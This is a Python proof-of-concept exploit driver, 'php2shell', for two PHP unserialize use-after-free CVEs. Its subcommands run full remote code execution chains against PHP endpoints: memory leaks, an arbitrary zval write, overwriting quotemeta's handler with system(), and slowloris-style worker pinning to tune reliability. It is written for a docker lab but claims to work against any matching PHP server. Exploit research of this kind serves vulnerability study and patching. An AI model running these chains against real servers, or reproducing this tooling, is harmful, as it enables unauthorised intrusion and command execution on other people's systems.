#!/usr/bin/env python3
"""php2shell minimal PoC sender (CVE-2026-109618 / CVE-2026-109619).

Targets the lab from docker-compose.yml but works against any PHP endpoint
(php -S, mod_php, php-fpm) with matching INI (small memory_limit, default
session upload progress settings).

Commands:
  check  <url>        print target info (index.php)
  var-hash-rw <url>        CVE-2026-109619 escalation: like poc-a4, but last_dtor
                       points at a fake var_dtor_entries inside the groom bytes
                       (used_slots is signed and only checked against
                       VAR_DTOR_ENTRIES_MAX), so the session decode's
                       php_var_unserialize() writes the record's i:<int> zval
                       at a chosen address - the arbitrary zval write.
                       --mode leak extends a live header string's len (OOB
                       read in the response), --mode rce overwrites
                       quotemeta's zif handler with zif_system (command
                       execution in the response). Addresses come from gdb on
                       a same-sequence worker (see README).
  proc-seeded-rce <url>  the full chain, leak-driven: a per-boot /proc/1/maps
                       bootstrap (binary base + request-heap chunk only), the
                       var-hash-rw leak round, a parser that derives every rce
                       address from the OOB read (the self-referential chain
                       -> chunk, zval_ptr_dtor -> binary base, the
                       run-time-cache slot array -> quotemeta's
                       zend_function), and the rce round on the derived set -
                       uid=<n>(<user>) in the response.
"""

import argparse
import json
import os
import re
import socket
import struct
import subprocess
import sys
import tempfile
import time
import urllib.parse

# put poc/ on sys.path so common.* imports resolve
_POC_ROOT = os.path.dirname(os.path.abspath(__file__))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_urllib import http_full  # noqa: E402
from chains.proc_seeded_rce import cmd_var_hash_rw, cmd_proc_seeded_rce  # noqa: E402,F401
from chains.apache_cookie_rce import cmd_apache_cookie_rce  # noqa: E402,F401


def cmd_check(args):
    s, h, b = http_full(args.url.rstrip("/") + "/index.php")
    print(f"HTTP {s}")
    for k in ("Server", "X-Powered-By", "Content-Type", "X-Redirect-By",
              "Set-Cookie", "Location"):
        if k in h and h[k]:
            print(f"{k}: {h[k]}")
    try:
        print(json.dumps(json.loads(b), indent=2))
    except Exception:
        print(b.decode("utf-8", "replace")[:600])


def cmd_remote_rce(args):
    """remote-rce: unserialize var_hash UAF -> offset-free remote RCE
    (CVE-2026-109618 / CVE-2026-109619). Thin wrapper over
    chains/remote_rce_route.run, which picks the apache/fpm route from --sapi
    (auto reads the Server banner). Needs an unserialize()+echo-serialize sink."""
    import importlib.util
    mod_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "chains", "remote_rce_route.py")
    spec = importlib.util.spec_from_file_location("remote_rce_route", mod_path)
    route = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(route)
    r = route.run(args.url, args.cmd, sapi=args.sapi, attempts=args.attempts)
    if r.get("stage") == "fire":
        return  # delivered (the marker lands even if the echo-sink fire SIGSEGVs)
    if r.get("stage") in ("invalid", "ambiguous"):
        raise SystemExit(f"[remote-rce] {r['error']}")
    raise SystemExit(f"[remote-rce] no fire ({r.get('stage')}); retry or check "
                     f"the sink/SAPI")


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)

    common = argparse.ArgumentParser(add_help=False)

    p = sub.add_parser("check", parents=[common])
    p.add_argument("url")
    p.set_defaults(fn=cmd_check)

    p = sub.add_parser("remote-rce", parents=[common],
                       help="unserialize var_hash UAF -> offset-free remote RCE "
                            "(iQingshan family; needs an unserialize()+echo-"
                            "serialize sink). Routes by --sapi. "
                            "uid=www-data verified on 8.5.11")
    p.add_argument("url", help="target URL incl. the sink path, e.g. "
                               "http://host/remote_app.php")
    p.add_argument("--sapi", choices=["auto", "apache", "fpm"], default="auto",
                   help="target SAPI / RCE route. auto (default) reads the "
                        "Server banner and STOPS if undetermined rather than "
                        "guessing.")
    p.add_argument("--cmd", default="id>/dev/shm/x",
                   help="command to run on the target (<=14 bytes; exfil via a "
                        "marker file read out-of-band - default id>/dev/shm/x)")
    p.add_argument("--attempts", type=int, default=3,
                   help="whole-chain retries (R-1 needs a near-fresh worker; the "
                        "apache route is ~1600 requests/attempt, fpm far fewer)")
    p.set_defaults(fn=cmd_remote_rce)

    p = sub.add_parser("apache-cookie-rce", parents=[common],
                       help="CVE-2026-109619 fully-remote one-shot RCE (9bie "
                            "chain: disclose_arm/disclose_read disclose chunk+libphp, "
                            "forge_arm/forge_fire forge a zend_array -> system; "
                            "stock php:8.4.26-apache)")
    p.add_argument("url", help="target base URL, e.g. http://127.0.0.1:18110")
    p.add_argument("--path", default="/index.php",
                   help="target PHP path (default /index.php)")
    p.add_argument("--service", default=None,
                   help="docker compose service of the target (lab): restart it "
                        "with --restart and read the proof file back via exec")
    p.add_argument("--restart", action="store_true",
                   help="docker compose restart the --service before the chain")
    p.add_argument("--workers", type=int, default=150,
                   help="legacy hold_workers pin: MaxRequestWorkers to pin with "
                        "incomplete POST bodies (1 = none; stock apache ships "
                        "150). Must match the target's REAL worker count - too "
                        "high serializes holders through mod_reqtimeout "
                        "(~10s each), stalling single-worker labs for several "
                        "minutes and looking like a crash. Ignored when "
                        "--pin-workers is set.")
    p.add_argument("--pin-workers", dest="pin_workers", type=int, default=0,
                   help="slowloris WorkerPin: size of the prefork pool to pin "
                        "(= MaxRequestWorkers). >0 opens that many unterminated "
                        "holders, probes saturation, frees exactly one child, and "
                        "re-pins per shot so disclose_arm/disclose_read/forge_arm/forge_fire share it. 0 (default) "
                        "keeps the legacy --workers pin - set --workers to match "
                        "the pool size, or it stalls instead of starving.")
    p.add_argument("--cmd", default="id",
                   help="shell command system() runs on the target (default id)")
    p.add_argument("--proof", default="/tmp/apache_cookie_rce.out",
                   help="in-container path --cmd's output is redirected to and "
                        "read back from (requires --service)")
    p.add_argument("--memory-limit", dest="memory_limit", default=None,
                   help="target PHP memory_limit (e.g. 8M/128M/256M/512M or an "
                        "int): selects a groom_scaling profile that scales the "
                        "disclose_arm/forge_arm OOM producers + disclose_read window with the limit. Unset "
                        "(default) keeps the legacy 128M constants byte-for-byte. "
                        "An explicit --big/--fillers/--fake-len still overrides.")
    p.add_argument("--big", type=int, default=None,
                   help="disclose_arm 8000-byte filler count (the send_cookie OOM knob); "
                        "78 is the validated value on 8.4.26-apache/128M. "
                        "Overrides --memory-limit's scaled value when given.")
    p.add_argument("--big-ladder", dest="big_ladder", default="",
                   help="optional disclose_arm free-page micro-sweep: comma-separated big "
                        "values cycled across shots, overriding --big when set. "
                        "UNVALIDATED (default off) - whether big tuning raises "
                        "the per-roll landable rate is still an open question; "
                        "the proven path is brute-forcing --big 78 over --shots")
    p.add_argument("--fillers", type=int, default=None,
                   help="forge_arm bin-32 filler count (shifts the dangling reference); "
                        "128M default 115. Overrides --memory-limit when given.")
    p.add_argument("--fake-len", dest="fake_len", type=lambda v: int(v, 0),
                   default=None, help="disclose_read OOB disclosure window bytes (128M "
                        "default 0xC8000). Overrides --memory-limit when given.")
    p.add_argument("--shots", type=int, default=12,
                   help="fresh disclose_arm->disclose_read->forge_arm->forge_fire attempts; stops on the first RCE "
                        "(each shot cycles the --big-ladder)")
    p.add_argument("--restart-each", dest="restart_each", action="store_true",
                   help="docker compose restart --service before every shot "
                        "(re-rolls ASLR; needed on a single-worker lab so a "
                        "crashed child does not poison the next shot)")
    p.add_argument("--measure", action="store_true",
                   help="do not stop on the first RCE: run all --shots and "
                        "print the full outcome tally (reliability measurement)")
    p.add_argument("--deterministic", dest="determ", action="store_true",
                   help="enable the recalibrated sid256/16M path: rshutdown "
                        "exact-size no-forge forge_fire reclaim, self_locate carrier "
                        "recovery, sid256 groom geometry and the calibrated disclose_arm "
                        "field size. OFF (default) keeps the proven 128M chain "
                        "byte-identical (the regression baseline / 'before' arm)")
    p.add_argument("--calibrate-big", dest="calibrate_big", action="store_true",
                   help="operator tool: sweep disclose_arm field sizing against a "
                        "display_errors=On lab (oomdisc-apache) via "
                        "oom_discriminator.classify, print the field size that "
                        "hits the target-size (key-init) OOM, and exit")
    p.add_argument("--timeout", type=float, default=600.0,
                   help="per-request socket timeout in seconds")
    p.add_argument("--version", default="8.4.26",
                   help="PHP version for the offsets table (default 8.4.26)")
    p.add_argument("--sapi", default="apache2handler",
                   help="target SAPI for the offsets table (default "
                        "apache2handler -> BUILTIN_OFFSETS['8.4.26-apache'])")
    p.add_argument("--show", action="store_true",
                   help="print the leak window's chunk pointer buckets")
    p.set_defaults(fn=cmd_apache_cookie_rce)

    p = sub.add_parser("var-hash-rw", parents=[common],
                       help="CVE-2026-109619 escalation (arbitrary zval write)")
    p.add_argument("url")
    p.add_argument("--mode", choices=["leak", "rce"], default="leak",
                    help="leak: extend the live $_POST['PHPSESSID'] string's "
                         "len (OOB read in the response); rce: overwrite "
                         "quotemeta's zif handler with zif_system")
    p.add_argument("--a", type=lambda v: int(v, 0), default=0,
                    help="address of the freed php_unserialize_data chunk A "
                         "(gdb, same request sequence); 0 = probe mode "
                         "(magic last_dtor; the gdb replica script patches "
                         "the fakes in place)")
    p.add_argument("--copy", type=lambda v: int(v, 0), default=None,
                    help="address of the live $_POST['g0'] zend_string (the "
                         "groom copy hosting the re-decode fakes)")
    p.add_argument("--binbase", type=lambda v: int(v, 0), default=None,
                    help="php binary load base (for BG(unserialize).data; "
                         "/proc/1/maps)")
    p.add_argument("--sid", type=lambda v: int(v, 0), default=None,
                    help="$_POST['PHPSESSID'] zend_string address "
                         "(leak mode)")
    p.add_argument("--fn", dest="fn_addr", type=lambda v: int(v, 0), default=None,
                    help="quotemeta zend_internal_function address (rce mode)")
    p.add_argument("--zsys", type=lambda v: int(v, 0), default=None,
                    help="zif_system address (rce mode)")
    p.add_argument("--value", type=lambda v: int(v, 0), default=None,
                   help="override the leak length (k1's value)")
    p.add_argument("--version", default=None,
                   help="PHP version of the target (offsets table selector; "
                        "default: probe index.php)")
    p.add_argument("--size", type=int, default=4071,
                   help="groom form-field size in bytes")
    p.add_argument("--grooms", type=int, default=2,
                    help="number of groom fields")
    p.add_argument("--service", default=None,
                    help="docker compose service to run curl inside (lab mode)")
    p.add_argument("--addr-file", default=None,
                    help="worker mode: after R1', wait for this JSON file "
                         "with the target worker's a/copy/binbase/sid (leak) "
                         "or fn/zsys (rce) addresses - derived from a "
                         "same-sequence gdb replica plus the /proc/<pid>/maps "
                         "region deltas of this worker")
    p.set_defaults(fn=cmd_var_hash_rw)

    p = sub.add_parser("proc-seeded-rce", parents=[common],
                       help="CVE-2026-109619 full chain: maps bootstrap -> "
                            "leak -> leak-driven address derivation -> RCE")
    p.add_argument("url")
    p.add_argument("--service", default=None,
                   help="docker compose service to run curl inside and read "
                        "/proc/1/maps from (lab bootstrap; the vulnerable "
                        "worker, e.g. --service cli-vuln)")
    p.add_argument("--a", type=lambda v: int(v, 0), default=0,
                   help="skip the maps bootstrap: the freed "
                        "php_unserialize_data chunk A (with --copy/--sid/"
                        "--binbase)")
    p.add_argument("--copy", type=lambda v: int(v, 0), default=None)
    p.add_argument("--sid", type=lambda v: int(v, 0), default=None)
    p.add_argument("--binbase", type=lambda v: int(v, 0), default=None)
    p.add_argument("--chunk", type=lambda v: int(v, 0), default=0,
                   help="override the request-heap chunk address found in "
                        "/proc/1/maps")
    p.add_argument("--version", default=None,
                   help="PHP version of the target (offsets table selector; "
                        "default: probe index.php)")
    p.add_argument("--leaks", type=int, default=3,
                   help="max leak rounds before the parse must succeed "
                        "(a fresh worker's first round carries compile "
                        "residue; round two parses)")
    p.add_argument("--size", type=int, default=4071)
    p.add_argument("--grooms", type=int, default=2)
    p.set_defaults(fn=cmd_proc_seeded_rce)

    args = ap.parse_args()
    args.fn(args)


if __name__ == "__main__":
    main()
